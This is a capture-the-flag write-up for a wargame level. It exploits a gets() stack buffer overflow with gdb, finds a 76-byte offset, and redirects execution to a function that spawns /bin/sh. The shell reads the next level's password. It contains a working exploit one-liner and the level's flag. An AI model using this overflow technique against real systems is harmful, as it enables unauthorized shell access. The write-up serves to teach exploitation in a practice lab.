
# Level 1

The binary we now have, only use the gets() C function.


We already know this functions is vulnerable to buffer overflow attacks, so we are going to overwrite the EIP so its execute a subshell for us.



# GDB

```gdb
Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
(gdb) 

```

So we have 2 function, main and run


main :
```gdb

Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.
(gdb)

```

run

```gdb
Dump of assembler code for function main:
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
   0x08048483 <+3>:	and    esp,0xfffffff0
   0x08048486 <+6>:	sub    esp,0x50
   0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.


```

The main function use the gets(), lets take a look at the run function.

```gdb

(gdb) disas run 
Dump of assembler code for function run:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18
   0x0804844a <+6>:	mov    eax,ds:0x80497c0
   0x0804844f <+11>:	mov    edx,eax
   0x08048451 <+13>:	mov    eax,0x8048570
   0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
   0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804846a <+38>:	mov    DWORD PTR [esp],eax
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret    
End of assembler dump.
(gdb) x/s 0x8048584
0x8048584:	 "/bin/sh"
(gdb) 

```

The run function use the system() call on "/bin/sh", tho the run function is not triggered by the main function.

So we will overwrite the EIP so it execute the addresse of "run"


The programm segfault when the EIP point to an addresse it doesn't own, so we can get the EIP adresses by making it segfaulting like so.


```gdb

(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level1/level1 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) 

```

The program segfaulted at 0x41414141,, 0x41 refer to the 'A' letter, so we successfuly overwritted it, but we must know how many A it needed to reach the EIP, so we can position to his adresses, and then overwrite it with the run function adresses so it execute it.


There is a lot of ways to calculate it, like knowing the size of the buffer, or using tools.

By using ghidra we know that the buffer size is 76.

So we are going to print 76 A, and then print the adresse of the run function in reverse order since it will read the adresse in reverse order.

```sh
level1@RainFall:~$ python -c "print 'A' * 76 + '\x44\x84\x04\x08'" | ./level1
Good... Wait what?
Segmentation fault (core dumped)
level1@RainFall:~$ 
```

It did executed our function but we dont have access to the shell.

```sh
(python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1
level1@RainFall:~$ (python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

```

And we got our flag